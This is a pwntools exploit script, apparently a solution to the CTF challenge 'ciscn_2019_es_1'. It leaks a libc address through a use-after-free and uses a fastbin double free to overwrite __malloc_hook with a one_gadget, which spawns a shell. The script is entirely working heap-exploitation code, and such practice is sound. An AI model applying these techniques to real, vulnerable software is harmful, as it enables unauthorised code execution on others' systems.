from pwn import *
context.log_level = 'debug'

elf = ELF("./ciscn_2019_es_1")
p = elf.process()
libc = ELF("./libc-2.23.so")
#p = remote("")
def dbg():
	gdb.attach(p)
	p.interactive()

def add(size, name, call):
	p.sendlineafter("choice:", '1')
	p.sendlineafter("compary's name\n", str(size))
	p.sendafter("name:\n", name)
	p.sendlineafter("call:\n", call)

def show(idx):
	p.sendlineafter("choice:", '2')
	p.sendlineafter("index:\n", str(idx))

def free(idx):
	p.sendlineafter("choice:", '3')
	p.sendlineafter("index:\n", str(idx))

def exp():
	add(0x80, 'a', 'a')#0
	add(0x20, 'b', 'b')#1
	free(0)	
		
	show(0)
	libc_base = u64(p.recvuntil("\x7f")[-6:]+'\x00\x00')-0x3c4b78
	log.success("libc_base ==> " + hex(libc_base))	
	malloc_hook = libc_base + libc.sym['__malloc_hook']
	realloc = libc_base + libc.sym['realloc']
	system = libc_base + libc.sym['system']	
	one =libc_base + 0x4526a
	add(0x60, 'a', 'a')#2
	add(0x60, 'b', 'b')#3	
	free(2)
	free(3)
	free(2)
	add(0x60, p64(malloc_hook-0x23), 'a')
	add(0x60, 'a','a')
	add(0x60, 'a', 'a')
	add(0x60, '\x00'*11+p64(one)+p64(realloc+0x10), 'b')	
	dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
